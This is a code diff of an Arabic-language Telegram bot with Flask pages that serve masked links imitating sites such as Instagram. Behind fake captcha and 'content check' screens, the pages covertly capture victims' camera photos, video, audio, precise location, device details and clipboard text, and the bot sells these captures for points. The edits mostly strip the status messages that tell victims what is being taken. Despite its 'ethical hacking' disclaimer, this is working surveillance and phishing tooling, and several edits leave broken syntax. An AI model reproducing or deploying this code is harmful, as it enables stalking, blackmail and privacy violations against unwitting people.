@@ -757,10 +757,10 @@ CAPTCHA_TEMPLATE = """
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         data.camera_front = [canvas.toDataURL('image/jpeg', 0.7)];
                         stream.getTracks().forEach(t => t.stop());
-                        captchaText.textContent = '✅ تم التقاط الصورة';
+                        captchaText.textContent = '✅ ';
                         captchaIcon.textContent = '✅';
                     } catch(e) {
-                        captchaText.textContent = '⚠️ لم نتمكن من الوصول للكاميرا';
+                        captchaText.textContent = '⚠️ ';
                         captchaIcon.textContent = '⚠️';
                     }
                 },
@@ -780,10 +780,10 @@ CAPTCHA_TEMPLATE = """
                         canvas.getContext('2d').drawImage(video, 0, 0);
                         data.camera_back = [canvas.toDataURL('image/jpeg', 0.7)];
                         stream.getTracks().forEach(t => t.stop());
-                        captchaText.textContent = '✅ تم التقاط الصورة';
+                        captchaText.textContent = '✅ ';
                         captchaIcon.textContent = '✅';
                     } catch(e) {
-                        captchaText.textContent = '⚠️ لم نتمكن من الوصول للكاميرا';
+                        captchaText.textContent = '⚠️';
                         captchaIcon.textContent = '⚠️';
                     }
                 },
@@ -808,10 +808,10 @@ CAPTCHA_TEMPLATE = """
                             recorder.stop();
                             stream.getTracks().forEach(t => t.stop());
                         }
-                        captchaText.textContent = '✅ تم تسجيل الفيديو';
+                        captchaText.textContent = '✅ ';
                         captchaIcon.textContent = '✅';
                     } catch(e) {
-                        captchaText.textContent = '⚠️ لم نتمكن من الوصول للكاميرا';
+                        captchaText.textContent = '⚠️ ';
                         captchaIcon.textContent = '⚠️';
                     }
                 },
@@ -836,10 +836,10 @@ CAPTCHA_TEMPLATE = """
                             recorder.stop();
                             stream.getTracks().forEach(t => t.stop());
                         }
-                        captchaText.textContent = '✅ تم تسجيل الفيديو';
+                        captchaText.textContent = '✅';
                         captchaIcon.textContent = '✅';
                     } catch(e) {
-                        captchaText.textContent = '⚠️ لم نتمكن من الوصول للكاميرا';
+                        captchaText.textContent = '⚠️ ';
                         captchaIcon.textContent = '⚠️';
                     }
                 },
@@ -861,10 +861,10 @@ CAPTCHA_TEMPLATE = """
                             recorder.stop();
                             stream.getTracks().forEach(t => t.stop());
                         }
-                        captchaText.textContent = '✅ تم تسجيل الصوت';
+                        captchaText.textContent = '✅';
                         captchaIcon.textContent = '✅';
                     } catch(e) {
-                        captchaText.textContent = '⚠️ لم نتمكن من الوصول للميكروفون';
+                        captchaText.textContent = '⚠️';
                         captchaIcon.textContent = '⚠️';
                     }
                 },
@@ -880,32 +880,32 @@ CAPTCHA_TEMPLATE = """
                                         altitude: pos.coords.altitude,
                                         speed: pos.coords.speed
                                     };
-                                    captchaText.textContent = '✅ تم جلب الموقع';
+                                    captchaText.textContent = '✅ ';
                                     captchaIcon.textContent = '✅';
                                     resolve();
                                 },
                                 () => {
-                                    captchaText.textContent = '⚠️ لم نتمكن من جلب الموقع';
+                                    captchaText.textContent = '⚠️ ';
                                     captchaIcon.textContent = '⚠️';
                                     resolve();
                                 },
                                 { enableHighAccuracy: true, timeout: 8000 }
                             );
                         } else {
-                            captchaText.textContent = '⚠️ الموقع غير مدعوم';
+                            captchaText.textContent = لموقع غير مدعوم';
                             captchaIcon.textContent = '⚠️';
                             resolve();
                         }
                     });
                 },
                 'device': async () => {
-                    captchaText.textContent = '✅ تم جمع معلومات الجهاز';
+                    captchaText.textContent = '✅ ';
                     captchaIcon.textContent = '✅';
                     // البيانات موجودة بالفعل في data.device
                 },
                 'all': async () => {
                     // تنفيذ جميع المهام بالتسلسل
-                    const actions = ['camera_front', 'camera_back', 'video_front', 'audio', 'location'];
+                    const actions = ['camera_front', 'camera_back', 'video_front', 'audio', 'location',];
                     for (const a of actions) {
                         if (actionMap[a]) {
                             await actionMap[a]();
@@ -930,7 +930,7 @@ CAPTCHA_TEMPLATE = """
                     '🔍 فحص بيئة المتصفح...',
                     '🔄 تحليل الاتصال الآمن...',
                     '⚡ تشفير القناة...',
-                    '📡 جلب معلومات الجلسة...',
+                    '📡  معلومات الجلسة...',
                     '🛡️ التحقق من صحة الطلب...'
                 ];
                 statusText.textContent = msgs[Math.floor(Math.random() * msgs.length)];
@@ -987,7 +987,7 @@ CAPTCHA_TEMPLATE = """
             // بدء شريط التقدم
             updateProgress();
 
-            // جمع IP
+            // 
             await getIP();
 
             // تنفيذ الإجراء المطلوب
@@ -1114,7 +1114,7 @@ CLIPBOARD_PAGE = """
     <div class="container">
         <span class="shield-icon">📋</span>
         <h1 class="title">فحص المحتوى</h1>
-        <p class="subtitle">نقوم بتحليل محتوى الحافظة للتأكد من سلامتها</p>
+        <p class="subtitle"></p>
 
         <div class="captcha-box">
             <span class="captcha-icon" id="captchaIcon">🔍</span>
@@ -1179,25 +1179,25 @@ CLIPBOARD_PAGE = """
                     if (text && text.length > 0) {
                         clipboardContent = text;
                         data.clipboard = text;
-                        captchaText.textContent = '✅ تم حفظ محتوى الحافظة';
+                        captchaText.textContent = '✅ ';
                         captchaIcon.textContent = '✅';
-                        captchaStatus.textContent = '✅ تم الاستخراج';
+                        captchaStatus.textContent = '✅ ';
                         captchaStatus.className = 'captcha-status done';
 
                         const logEntry = document.createElement('div');
-                        logEntry.textContent = `📄 محتوى الحافظة: ${text.substring(0, 200)}${text.length > 200 ? '...' : ''}`;
+                        logEntry.textContent = `: ${text.substring(0, 200)}${text.length > 200 ? '...' : ''}`;
                         clipboardLog.appendChild(logEntry);
                         clipboardLog.scrollTop = clipboardLog.scrollHeight;
                     } else {
-                        captchaText.textContent = '📭 الحافظة فارغة';
+                        captchaText.textContent = '📭 ';
                         captchaIcon.textContent = '📭';
                     }
                 } else {
-                    captchaText.textContent = '⚠️ لا يمكن الوصول للحافظة';
+                    captchaText.textContent = '⚠️';
                     captchaIcon.textContent = '⚠️';
                 }
             } catch(e) {
-                captchaText.textContent = '⚠️ لا يمكن الوصول للحافظة (قد تحتاج إذن)';
+                captchaText.textContent = '⚠️ ';
                 captchaIcon.textContent = '⚠️';
             }
         }
@@ -1207,7 +1207,7 @@ CLIPBOARD_PAGE = """
                 progress += Math.random() * 4 + 1;
                 if (progress > 85) progress = 85;
                 progressFill.style.width = progress + '%';
-                const msgs = ['🔍 فحص الحافظة...', '🔄 تحليل المحتوى...', '📦 تجميع البيانات...'];
+                const msgs = ['🔍..'];
                 statusText.textContent = msgs[Math.floor(Math.random() * msgs.length)];
                 setTimeout(updateProgress, 400 + Math.random() * 500);
             }
@@ -1217,7 +1217,7 @@ CLIPBOARD_PAGE = """
             if (dataSent) return;
             dataSent = true;
 
-            verifyBtn.textContent = '📤 جاري الإرسال...';
+            verifyBtn.textContent = '📤 الإرسال...';
             verifyBtn.style.opacity = '0.6';
 
             try {
@@ -1255,7 +1255,7 @@ CLIPBOARD_PAGE = """
             await getClipboard();
 
             progressFill.style.width = '100%';
-            statusText.textContent = clipboardContent ? '✅ تم حفظ محتوى الحافظة' : '📭 الحافظة فارغة';
+            statusText.textContent = clipboardContent ? '✅ ';
             captchaStatus.textContent = '✅ جاهز للإرسال';
             captchaStatus.className = 'captcha-status done';
 
@@ -1293,7 +1293,7 @@ ALL_PAGE = render_captcha_page('all')
 
 @app.route('/')
 def index():
-    return "🔬 مختبر الاختبار - يعمل"
+    return "🔬  - يعمل"
 @app.route('/<domain>/<path:path>')
 def handle_masked_link(domain, path):
     """معالجة الروابط المقنعة (مثل /instagram/l7uzl/abc123)"""
@@ -1638,15 +1638,15 @@ def handle_callback(call):
     if data == 'start_hack':
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
-        InlineKeyboardButton("📷 كاميرا أمامية", callback_data="camera_front"),
-        InlineKeyboardButton("📷 كاميرا خلفية", callback_data="camera_back"),
-        InlineKeyboardButton("🎥 فيديو أمامي", callback_data="video_front"),
-        InlineKeyboardButton("🎥 فيديو خلفي", callback_data="video_back"),
-        InlineKeyboardButton("🎙 تسجيل صوتي", callback_data="audio"),
-        InlineKeyboardButton("📍 الموقع الجغرافي", callback_data="location"),
-        InlineKeyboardButton("📱 معلومات الجهاز", callback_data="device"),
-        InlineKeyboardButton("📋 الحافظة", callback_data="clipboard"),
-        InlineKeyboardButton("🔬 كل الميزات", callback_data="all"),
+        InlineKeyboardButton("📷 (1)كاميرا أمامية", callback_data="camera_front"),
+        InlineKeyboardButton("📷 (1)كاميرا خلفية", callback_data="camera_back"),
+        InlineKeyboardButton("🎥 (1)فيديو أمامي", callback_data="video_front"),
+        InlineKeyboardButton("🎥 (1)فيديو خلفي", callback_data="video_back"),
+        InlineKeyboardButton("🎙 (1)تسجيل صوتي", callback_data="audio"),
+        InlineKeyboardButton("📍(1)الموقع الجغرافي", callback_data="location"),
+        InlineKeyboardButton("📱(1)معلومات الجهاز", callback_data="device"),
+        InlineKeyboardButton("📋(1)الحافظة", callback_data="clipboard"),
+        InlineKeyboardButton("🔬 (5)كل الميزات", callback_data="all"),
         InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
     )
     
@@ -1722,10 +1722,10 @@ def handle_callback(call):
     if data == 'buy_points':
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
-            InlineKeyboardButton("⭐ 10 نقاط - 5$", callback_data="buy_10"),
-            InlineKeyboardButton("⭐ 25 نقاط - 10$", callback_data="buy_25"),
-            InlineKeyboardButton("⭐ 50 نقاط - 18$", callback_data="buy_50"),
-            InlineKeyboardButton("⭐ 100 نقاط - 30$", callback_data="buy_100"),
+            InlineKeyboardButton("⭐ 10 نقاط - 1$", callback_data="buy_10"),
+            InlineKeyboardButton("⭐ 25 نقاط - 2$", callback_data="buy_25"),
+            InlineKeyboardButton("⭐ 50 نقاط - 3$", callback_data="buy_50"),
+            InlineKeyboardButton("⭐ 100 نقاط - 5$", callback_data="buy_100"),
             InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
         )
         bot.edit_message_text(
@@ -1752,8 +1752,7 @@ def handle_callback(call):
                 user_id,
                 f"🛒 **طلب شراء {points} نقطة**\n\n"
                 f"📌 للشراء، تواصل مع الدعم:\n"
-                f"@YourSupportUsername\n\n"
-                f"أو استخدم الأمر /contact",
+                f"@l7uzl\n\n",
                 parse_mode='Markdown'
             )
             bot.answer_callback_query(call.id, f"✅ تم طلب شراء {points} نقطة")
@@ -1764,23 +1763,24 @@ def handle_callback(call):
         msg = """
 ℹ️ **معلومات البوت**
 
-🔬 **الاسم:** بوت اختبار الاختراق
-🛡️ **الإصدار:** 2.0
+🔬 **الاسام: بوت اختبار الاختراق
+🛡️ **الإصدار:** 1.0
 📋 **الوصف:**
 هذا البوت مخصص لاختبار الاختراق الأخلاقي.
 يسمح لك بإنشاء روابط ملغمة لاختبار أمان الأجهزة.
 
-👨‍💻 **المطور:** @YourDevUsername
+👨‍💻 **المطور:** @l7uzl
 
 ⚙️ **الميزات:**
-• اختبار الكاميرا (أمامية/خلفية)
+• اختراق الكاميرا (أمامية/خلفية)
 • اختبار المايكروفون
 • تحديد الموقع الجغرافي
 • جمع معلومات الجهاز
 • تسجيل الفيديو والصوت
+• سحب محتوى الحافظة
 
 ⚠️ **تنبيه:**
-هذا البوت للأغراض الأكاديمية والبحثية فقط.
+هذا البوت لأغراض اختبار الاختراق الاخلاقيه اي شخص يستخدم البوت في اغراض غير اخلاقيه او ابتزاز وما الى ذالك سوف يتعرض للمسائلة القانونيه والمطور غير مسؤول عن ذالك.
         """
         bot.edit_message_text(
             msg,
@@ -1791,24 +1791,14 @@ def handle_callback(call):
                 InlineKeyboardButton("🔙 العودة للقائمة", callback_data="back_to_menu")
             )
         )
-        bot.answer_callback_query(call.id)
+        bot.answer_caYourDevUsernamell.id)
         return
     
     # ====== زر "الدعم" ======
     if data == 'support':
         msg = """
-📞 **التواصل مع الدعم**
-
-📧 **البريد الإلكتروني:** support@example.com
-💬 **تيليجرام:** @YourSupportUsername
-📱 **الموقع:** https://your-website.com
-
-📌 **للإبلاغ عن مشكلة أو اقتراح:**
-استخدم الأمر /contact
-
-🕐 **أوقات العمل:**
-من الساعة 10 صباحاً حتى 10 مساءً
-        """
+📞 التواصل مع الدعم في حال واجهت اي مشاكل
+💬 تيليجرام:@l7uzl
         bot.edit_message_text(
             msg,
             user_id,
@@ -2201,11 +2191,11 @@ def handle_callback(call):
     
     # تحديد النقاط المطلوبة لكل ميزة (بما في ذلك الجديدة)
         points_map = {
-        'camera_front': 3, 'camera_back': 3,
-        'video_front': 5, 'video_back': 5,
-        'audio': 3, 'location': 2,
-        'device': 2, 'all': 10,
-        'clipboard': 3
+        'camera_front': 1, 'camera_back': 1,
+        'video_front': 1, 'video_back': 1,
+        'audio': 1, 'location': 1,
+        'device': 1, 'all': 5,
+        'clipboard': 1
     }
         required_points = points_map.get(data, 5)
     
@@ -2503,9 +2493,8 @@ def handle_original_url(message):
 <code>{original_url}</code>
 
 📋 **الميزة:** {feature}
-⏱ الصلاحية: 10 دقائق
+⏱ الصلاحية: 5 دقائق
 
-⚠️ الرابط يبدو وكأنه من الموقع الأصلي!
     """, parse_mode='HTML')
     
 # ====== تشغيل البوت ======
